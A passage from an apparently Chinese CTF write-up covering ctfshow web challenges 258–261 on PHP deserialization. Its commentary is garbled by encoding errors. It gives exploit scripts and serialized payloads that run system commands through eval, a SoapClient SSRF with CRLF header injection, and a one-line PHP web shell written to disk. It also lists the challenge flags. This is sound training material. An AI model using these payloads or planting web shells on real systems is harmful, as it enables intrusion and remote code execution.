operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('cat flag.php');"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// ç»•è¿‡ preg_match</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$str1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token comment">// echo $str;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="32"></td><td><pre>    </pre></td></tr><tr><td data-num="33"></td><td><pre>payload:</pre></td></tr><tr><td data-num="34"></td><td><pre>?username=a&amp;password=b</pre></td></tr><tr><td data-num="35"></td><td><pre>Cookie:user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A1%3A%22a%22%3Bs%3A8%3A%22password%22%3Bs%3A1%3A%22b%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system%28%27cat+flag.php%27%29%3B%22%3B%7D%7D</pre></td></tr></table></figure><pre><code>ctfshow&#123;fcb320c5-47bc-4aed-8d8f-c38b8cc849f5&#125;
</code></pre><h2 id="web259"><a class="anchor" href="#web259">#</a> web259</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">//vip can get flag one key</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token variable">$vip</span><span class="token operator">-></span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>flag<span class="token operator">.</span><span class="token class-name type-declaration">php</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>		<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>é¢˜ç›®è€ƒå¯ŸphpåŸç”Ÿç±»çš„ååºåˆ—åŒ–</pre></td></tr><tr><td data-num="2"></td><td><pre>è¦æƒ³å¾—åˆ°flagï¼Œå¿…é¡»æœ¬åœ°è®¿é—®flag.phpè€Œä¸”å¸¦ä¸Štokenï¼Œä¸€çœ‹åˆ°æ˜¯æ ¹æ®x-forwarded-foræ¥åˆ¤æ–­çš„ï¼Œå› æ­¤è¿™é¢˜éœ€è¦åˆ©ç”¨åŸç”Ÿç±»çš„ååºåˆ—åŒ–æ¥å®ç°SSRFï¼Œè€ƒå¯Ÿçš„æ˜¯phpçš„SoapClientåŸç”Ÿç±»çš„ååºåˆ—åŒ–ã€‚</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>éœ€è¦ç”¨åˆ°phpæ‰©å±•soapå’Œnatcat</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>é¦–å…ˆæ„é€ ç›‘å¬9999ç«¯å£æŸ¥çœ‹å¤´</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token operator">.</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1:9999/'</span><span class="token punctuation">,</span>location<span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1:9999/flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token variable">$client</span> <span class="token operator">=></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="12"></td><td><pre>    </pre></td></tr><tr><td data-num="13"></td><td><pre>nc -lvp 9999</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>ç›‘å¬æˆåŠŸåï¼ŒæŒ‰ç…§ç›‘å¬åçš„æ ¼å¼ä¿®æ”¹å†…å®¹æ·»åŠ è¡¨å•æ ¼å¼</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//token=ctfshow</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$ua</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"K1nako\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1:9999/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1:9999/flag.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token variable">$ua</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token variable">$client</span><span class="token operator">-></span><span class="token function">getflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>//ç›‘å¬å†…å®¹</pre></td></tr><tr><td data-num="12"></td><td><pre>POST /flag.php HTTP/1.1</pre></td></tr><tr><td data-num="13"></td><td><pre>Host: 127.0.0.1:9999</pre></td></tr><tr><td data-num="14"></td><td><pre>Connection: Keep-Alive</pre></td></tr><tr><td data-num="15"></td><td><pre>User-Agent: K1nako</pre></td></tr><tr><td data-num="16"></td><td><pre>Content-Type:application/x-www-form-urlencoded</pre></td></tr><tr><td data-num="17"></td><td><pre>Content-Length:13	//é•¿åº¦ä¸º13ï¼štoken=ctfshowï¼Œé™åˆ¶é•¿åº¦è¿‡æ»¤å‰©ä¸‹æ²¡ç”¨çš„å†…å®¹</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>token=ctfshow</pre></td></tr><tr><td data-num="20"></td><td><pre>Content-Type: text/xml; charset=utf-8</pre></td></tr><tr><td data-num="21"></td><td><pre>SOAPAction: "http://127.0.0.1:9999/#getflag"</pre></td></tr><tr><td data-num="22"></td><td><pre>Content-Length: 389</pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?</span>xml version<span class="token operator">=</span><span class="token string double-quoted-string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string double-quoted-string">"UTF-8"</span><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">SOAP-ENV:</span>Envelope</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>SOAP-ENV</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/envelope/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>ns1</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1:9999/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xsd</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>SOAP-ENC</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/encoding/<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">SOAP-ENV:</span>encodingStyle</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://schemas.xmlsoap.org/soap/encoding/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">SOAP-ENV:</span>Body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">ns1:</span>getflag</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">SOAP-ENV:</span>Body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">SOAP-ENV:</span>Envelope</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>æœ€ç»ˆæ„é€ payloadå¦‚ä¸‹</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">//token=ctfshow</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token variable">$ua</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"K1nako\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uri'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'location'</span><span class="token operator">=></span><span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=></span><span class="token variable">$ua</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">//$client->getflag();</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$client</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><pre><code>ctfshow&#123;4ee6966f-f129-4019-bf80-76aaebe2ed23&#125;
</code></pre><h2 id="web260"><a class="anchor" href="#web260">#</a> web260</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow_i_love_36D/'</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">?</span>ctfshow<span class="token operator">=</span>ctfshow_i_love_36D</pre></td></tr></table></figure><pre><code>ctfshow&#123;5bb8fa71-ba31-4453-b382-ea93289a2672&#125;
</code></pre><h2 id="web261"><a class="anchor" href="#web261">#</a> web261</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span> <span class="token operator">||</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>if($this->code==0x36d)çš„0x36dæ²¡æœ‰å¼•å·è¯´æ˜æ˜¯æ•´å‹ï¼Œ36dè½¬åè¿›åˆ¶æ˜¯877ï¼Œæ‰€ä»¥åªéœ€è¦a=877.php,bå†™ä¸€å¥è¯æœ¨é©¬è¿æ¥å³å¯</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>æ„é€ payloadï¼š</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$code</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token operator">=</span><span class="token string single-quoted-string">'877.php'</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[K1nako]);?>'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$u</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$p</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><pre><code>ä¼ å…¥vipçš„åºåˆ—åŒ–å€¼åè®¿é—®877.phpç„¶åè¿æ¥å³å¯
</code></pre><p><img data-src="C:%5CUsers%5C14420%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230204163609509.png" alt="image-20230204163609509"></p><pre><code>ctfshow&#123;42c743fe-fdb8-4c93-8e10-df905d5c28aa&#125;
